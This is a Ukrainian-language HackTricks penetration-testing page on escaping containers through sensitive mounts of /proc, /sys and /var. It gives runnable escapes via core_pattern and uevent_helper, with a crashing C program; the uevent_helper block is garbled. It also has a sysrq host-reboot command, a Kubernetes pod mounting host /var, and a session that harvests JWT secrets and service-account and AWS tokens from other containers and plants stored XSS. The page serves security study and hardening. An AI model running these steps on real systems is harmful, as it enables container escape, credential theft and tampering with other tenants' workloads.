# Чутливі монтування

{{#include ../../../../banners/hacktricks-training.md}}

Відкриття `/proc`, `/sys` та `/var` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атаки та розкриття інформації. Ці каталоги містять чутливі файли, які, якщо неправильно налаштовані або доступні несанкціонованому користувачу, можуть призвести до втечі з контейнера, модифікації хоста або надати інформацію, що сприяє подальшим атакам. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.

**Ви можете знайти додаткові деталі кожної потенційної вразливості в** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Вразливості procfs

### `/proc/sys`

Цей каталог дозволяє доступ для зміни змінних ядра, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, які викликають занепокоєння:

#### **`/proc/sys/kernel/core_pattern`**

- Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
- Якщо ви можете записувати в цей файл, можливо, записати конвеєр `|`, за яким слідує шлях до програми або скрипту, який буде виконано після того, як станеться збій.
- Зловмисник може знайти шлях всередині хоста до свого контейнера, виконавши `mount`, і записати шлях до бінарного файлу всередині файлової системи свого контейнера. Потім, викликати збій програми, щоб змусити ядро виконати бінарний файл поза контейнером.

- **Приклад тестування та експлуатації**:
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Set custom handler
sleep 5 && ./crash & # Trigger handler
```
Перевірте [цей пост](https://pwning.systems/posts/escaping-containers-for-fun/) для отримання додаткової інформації.

Приклад програми, яка викликає збій:
```c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) {
buf[i] = 1;
}
return 0;
}
```
#### **`/proc/sys/kernel/modprobe`**

- Докладно в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Містить шлях до завантажувача модулів ядра, який викликається для завантаження модулів ядра.
- **Приклад перевірки доступу**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

- Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
- Глобальний прапор, який контролює, чи панікує ядро або викликає OOM-убивцю, коли виникає умова OOM.

#### **`/proc/sys/fs`**

- Згідно з [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), містить параметри та інформацію про файлову систему.
- Доступ на запис може дозволити різні атаки відмови в обслуговуванні проти хоста.

#### **`/proc/sys/fs/binfmt_misc`**

- Дозволяє реєструвати інтерпретатори для ненативних бінарних форматів на основі їх магічного номера.
- Може призвести до підвищення привілеїв або доступу до кореневого терміналу, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
- Відповідна експлуатація та пояснення:
- [Бідний чоловік rootkit через binfmt_misc](https://github.com/toffan/binfmt_misc)
- Детальний посібник: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Інші в `/proc`

#### **`/proc/config.gz`**

- Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
- Корисно для атакуючих для виявлення вразливостей у запущеному ядрі.

#### **`/proc/sysrq-trigger`**

- Дозволяє викликати команди Sysrq, потенційно викликаючи негайні перезавантаження системи або інші критичні дії.
- **Приклад перезавантаження хоста**:

```bash
echo b > /proc/sysrq-trigger # Перезавантажує хост
```

#### **`/proc/kmsg`**

- Відкриває повідомлення з кільцевого буфера ядра.
- Може допомогти в експлуатації ядра, витоках адрес та надати чутливу інформацію про систему.

#### **`/proc/kallsyms`**

- Перераховує експортовані символи ядра та їх адреси.
- Важливо для розробки експлуатацій ядра, особливо для подолання KASLR.
- Інформація про адреси обмежена, якщо `kptr_restrict` встановлено на `1` або `2`.
- Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

- Інтерфейси з пристроєм пам'яті ядра `/dev/mem`.
- Історично вразливий до атак підвищення привілеїв.
- Більше про [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

- Представляє фізичну пам'ять системи у форматі ELF core.
- Читання може витікати вміст пам'яті хост-системи та інших контейнерів.
- Великий розмір файлу може призвести до проблем з читанням або збоїв програмного забезпечення.
- Детальне використання в [Витягування /proc/kcore у 2019 році](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

- Альтернативний інтерфейс для `/dev/kmem`, що представляє віртуальну пам'ять ядра.
- Дозволяє читання та запис, отже, безпосереднє модифікування пам'яті ядра.

#### **`/proc/mem`**

- Альтернативний інтерфейс для `/dev/mem`, що представляє фізичну пам'ять.
- Дозволяє читання та запис, модифікація всієї пам'яті вимагає вирішення віртуальних адрес у фізичні.

#### **`/proc/sched_debug`**

- Повертає інформацію про планування процесів, обходячи захисти простору PID.
- Відкриває імена процесів, ID та ідентифікатори cgroup.

#### **`/proc/[pid]/mountinfo`**

- Надає інформацію про точки монту в просторі монту процесу.
- Відкриває місцезнаходження контейнера `rootfs` або образу.

### Вразливості `/sys`

#### **`/sys/kernel/uevent_helper`**

- Використовується для обробки `uevents` пристроїв ядра.
- Запис у `/sys/kernel/uevent_helper` може виконувати довільні скрипти при спрацьовуванні `uevent`.
- **Приклад для експлуатації**: %%%bash

#### Створює корисне навантаження

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Знаходить шлях хоста з OverlayFS для контейнера

host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)

#### Встановлює uevent_helper на шкідливий помічник

echo "$host_path/evil-helper" > /sys/kernel/uevent_helper

#### Викликає uevent

echo change > /sys/class/mem/null/uevent

#### Читає вихідні дані

cat /output %%%

#### **`/sys/class/thermal`**

- Контролює налаштування температури, потенційно викликаючи атаки DoS або фізичні пошкодження.

#### **`/sys/kernel/vmcoreinfo`**

- Витікає адреси ядра, потенційно компрометуючи KASLR.

#### **`/sys/kernel/security`**

- Містить інтерфейс `securityfs`, що дозволяє налаштування Linux Security Modules, таких як AppArmor.
- Доступ може дозволити контейнеру вимкнути свою MAC-систему.

#### **`/sys/firmware/efi/vars` та `/sys/firmware/efi/efivars`**

- Відкриває інтерфейси для взаємодії з EFI змінними в NVRAM.
- Неправильна конфігурація або експлуатація можуть призвести до "заблокованих" ноутбуків або неможливих для завантаження хост-машин.

#### **`/sys/kernel/debug`**

- `debugfs` пропонує інтерфейс для налагодження без правил до ядра.
- Історія проблем з безпекою через його необмежений характер.

### Вразливості `/var`

Папка **/var** хоста містить сокети виконання контейнерів та файлові системи контейнерів. Якщо ця папка змонтована всередині контейнера, цей контейнер отримає доступ на читання та запис до файлових систем інших контейнерів з правами root. Це може бути зловжито для перемикання між контейнерами, викликання відмови в обслуговуванні або для створення бекдорів в інших контейнерах та програмах, що в них виконуються.

#### Kubernetes

Якщо контейнер такого типу розгорнуто з Kubernetes:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: pod-mounts-var
labels:
app: pentest
spec:
containers:
- name: pod-mounts-var-folder
image: alpine
volumeMounts:
- mountPath: /host-var
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "while true; do sleep 30; done;" ]
volumes:
- name: noderoot
hostPath:
path: /var
```
Всередині контейнера **pod-mounts-var-folder**:
```bash
/ # find /host-var/ -type f -iname '*.env*' 2>/dev/null

/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/201/fs/usr/src/app/.env.example
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/135/fs/docker-entrypoint.d/15-local-resolvers.envsh

/ # cat /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/105/fs/usr/src/app/.env.example | grep -i secret
JWT_SECRET=85d<SNIP>a0
REFRESH_TOKEN_SECRET=14<SNIP>ea

/ # find /host-var/ -type f -iname 'index.html' 2>/dev/null
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/57/fs/usr/src/app/node_modules/@mapbox/node-pre-gyp/lib/util/nw-pre-gyp/index.html
<SNIP>
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/share/nginx/html/index.html
/host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/132/fs/usr/share/nginx/html/index.html

/ # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
are/nginx/html/index2.html
```
XSS було досягнуто:

![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)

Зверніть увагу, що контейнер НЕ потребує перезавантаження або чогось подібного. Будь-які зміни, внесені через змонтовану **/var** папку, будуть застосовані миттєво.

Ви також можете замінити конфігураційні файли, двійкові файли, сервіси, файли додатків та профілі оболонки для досягнення автоматичного (або напівавтоматичного) RCE.

##### Доступ до облікових даних хмари

Контейнер може читати токени K8s serviceaccount або токени AWS webidentity, що дозволяє контейнеру отримати несанкціонований доступ до K8s або хмари:
```bash
/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
<SNIP>
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
```
#### Docker

Експлуатація в Docker (або в розгортаннях Docker Compose) є точно такою ж, за винятком того, що зазвичай файлові системи інших контейнерів доступні під іншим базовим шляхом:
```bash
$ docker info | grep -i 'docker root\|storage driver'
Storage Driver: overlay2
Docker Root Dir: /var/lib/docker
```
Отже, файлові системи знаходяться під `/var/lib/docker/overlay2/`:
```bash
$ sudo ls -la /var/lib/docker/overlay2

drwx--x---  4 root root  4096 Jan  9 22:14 00762bca8ea040b1bb28b61baed5704e013ab23a196f5fe4758dafb79dfafd5d
drwx--x---  4 root root  4096 Jan 11 17:00 03cdf4db9a6cc9f187cca6e98cd877d581f16b62d073010571e752c305719496
drwx--x---  4 root root  4096 Jan  9 21:23 049e02afb3f8dec80cb229719d9484aead269ae05afe81ee5880ccde2426ef4f
drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044cd22b68ff1bb152f1a3c8a377f2
<SNIP>
```
#### Примітка

Фактичні шляхи можуть відрізнятися в різних налаштуваннях, тому найкраще використовувати команду **find** для
виявлення файлових систем інших контейнерів та токенів SA / веб-ідентичності



### Посилання

- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
- [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc_group_understanding_hardening_linux_containers-1-1.pdf)
- [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf)

{{#include ../../../../banners/hacktricks-training.md}}
